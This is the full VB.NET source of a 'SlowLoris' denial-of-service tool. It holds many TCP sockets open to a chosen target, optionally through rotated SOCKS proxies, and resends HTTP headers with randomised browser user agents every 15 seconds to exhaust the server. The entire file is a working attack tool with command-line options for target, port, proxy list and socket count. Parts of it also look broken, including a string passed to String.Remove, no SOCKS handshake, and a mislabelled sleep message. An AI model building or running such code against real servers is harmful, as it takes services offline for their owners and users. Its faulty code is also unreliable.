Imports System
Imports System.IO
Imports System.Net
Imports System.Net.Sockets
Imports System.Text
Imports System.Threading

Module module1








    Private ReadOnly DelayMilliseconds As Integer = 5000
    'testing proxy effeciency
    Private ReadOnly DefaultProxyTimeoutSeconds As Integer = 5
    'sleep between each socket
    Private ReadOnly DefaultSleepSeconds As Integer = 15
    Private ReadOnly DefaultNumSockets As Integer = 150
    'user agent that the program going to use randomly
    Private ReadOnly DefaultUserAgents As String() = {
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36",
        "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Mobile Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Linux; Android 8.0.0; SM-G950F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Mobile Safari/537.36"
    }

    Public Sub Main(ByVal args As String())
        Dim target As String = ""
        Dim port As Integer = 80
        Dim proxyFile As String = ""
        Dim proxyTimeoutSeconds As Integer = DefaultProxyTimeoutSeconds
        Dim sleepSeconds As Integer = DefaultSleepSeconds
        Dim numSockets As Integer = DefaultNumSockets

        If args.Length = 0 Then
            Console.WriteLine("Usage: SlowLoris <target> -p <port> [-x <proxy_file>] [-proxytimeout <proxy_timeout_seconds>] [-sleep <sleep_seconds>] [-n <num_sockets>]")
            Return
        End If

        For i As Integer = 0 To args.Length - 1
            If args(i) = "-p" AndAlso i < args.Length - 1 Then
                If Integer.TryParse(args(i + 1), port) Then
                    i += 1
                End If
            ElseIf args(i) = "-x" AndAlso i < args.Length - 1 Then
                proxyFile = args(i + 1)
                i += 1
            ElseIf args(i) = "-proxytimeout" AndAlso i < args.Length - 1 Then
                If Integer.TryParse(args(i + 1), proxyTimeoutSeconds) Then
                    i += 1
                End If
            ElseIf args(i) = "-sleep" AndAlso i < args.Length - 1 Then
                If Integer.TryParse(args(i + 1), sleepSeconds) Then
                    i += 1
                End If
            ElseIf args(i) = "-n" AndAlso i < args.Length - 1 Then
                If Integer.TryParse(args(i + 1), numSockets) Then
                    i += 1
                End If
            Else
                target = args(i)
            End If
        Next

        If target = "" Then
            Console.WriteLine("No target specified.")
            Return
        End If

        If proxyFile <> "" AndAlso Not File.Exists(proxyFile) Then
            Console.WriteLine("Proxy file does not exist.")
            Return
        End If

        Dim proxies As New List(Of String)()
        If proxyFile <> "" Then
            Try
                Using sr As New StreamReader(proxyFile)
                    While Not sr.EndOfStream
                        Dim proxy As String = sr.ReadLine()
                        proxies.Add(proxy)
                    End While
                End Using
            Catch ex As Exception
                Console.WriteLine("Error reading proxy file: " & ex.Message)
                Return
            End Try
        End If
        'starting proxy loading
        Dim sockets As New List(Of Socket)()
        For i As Integer = 0 To numSockets - 1
            Dim proxy As String = If(proxies.Count > 0, proxies(i Mod proxies.Count), "")
            Dim endPoint As EndPoint = If(proxy <> "", ParseProxyEndPoint(proxy), New DnsEndPoint(target, port))
            Dim socket As New Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)

            Try
                Dim connectResult As IAsyncResult = socket.BeginConnect(endPoint, Nothing, Nothing)
                If connectResult.AsyncWaitHandle.WaitOne(TimeSpan.FromSeconds(proxyTimeoutSeconds)) Then
                    socket.EndConnect(connectResult)
                    If socket.Connected Then
                        Console.WriteLine("Connected socket number: " & i.ToString() & " using proxy: " & proxy)
                        sockets.Add(socket)
                    End If
                Else
                    socket.Close()
                    Console.WriteLine("Connection timeout for socket number: " & i.ToString() & " using proxy: " & proxy)
                End If
            Catch ex As Exception
                Console.WriteLine("Error connecting socket: " & ex.Message & " using proxy: " & proxy)
            End Try


        Next
        'starting proxy connection

        While True
            For Each socket As Socket In sockets.ToList()
                Try
                    Dim userAgent As String = DefaultUserAgents(New Random().Next(0, DefaultUserAgents.Length))
                    Dim headers As String = "GET / HTTP/1.1" & vbCrLf &
                                            "Host: " & target & vbCrLf &
                                            "User-Agent: " & userAgent & vbCrLf &
                                            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" & vbCrLf &
                                            "Connection: Keep-Alive" & vbCrLf & vbCrLf
                    socket.Send(Encoding.ASCII.GetBytes(headers))
                    Console.WriteLine("[" & DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss") & "] Sent request from socket: " & socket.Handle.ToString() & If(proxyFile <> "", " using proxy: " & socket.RemoteEndPoint.ToString(), ""))
                Catch ex As Exception
                    Console.WriteLine("[" & DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss") & "] Error: " & ex.Message)
                    sockets.Remove(socket)
                    Dim newSocket As New Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
                    Dim proxy As String = If(proxies.Count > 0, proxies(New Random().Next(0, proxies.Count)), "")
                    Dim endPoint As EndPoint = If(proxy <> "", ParseProxyEndPoint(proxy), New DnsEndPoint(target, port))
                    Try
                        newSocket.Connect(endPoint)
                        sockets.Add(newSocket)
                        Console.WriteLine("[" & DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss") & "] Reconnected new socket: " & newSocket.Handle.ToString() & If(proxyFile <> "", " using proxy: " & newSocket.RemoteEndPoint.ToString(), ""))

                    Catch exg As Exception
                        Console.WriteLine("faild to connect new socket ")
                    End Try
                End Try
            Next
            Console.WriteLine("sleep 5 sec")
            Thread.Sleep(sleepSeconds * 1000)
        End While
    End Sub

    Private Function ParseProxyEndPoint(ByVal proxy As String) As EndPoint
        proxy = proxy.Remove("socks4://")
        Dim proxyParts As String() = proxy.Split(":")
        Dim proxyHost As String = proxyParts(0)
        Console.WriteLine(proxyHost)
        Console.WriteLine(proxyParts(1))
        Dim proxyPort As Integer = Integer.Parse(proxyParts(1))
        Return New IPEndPoint(IPAddress.Parse(proxyHost), proxyPort)
    End Function
End Module
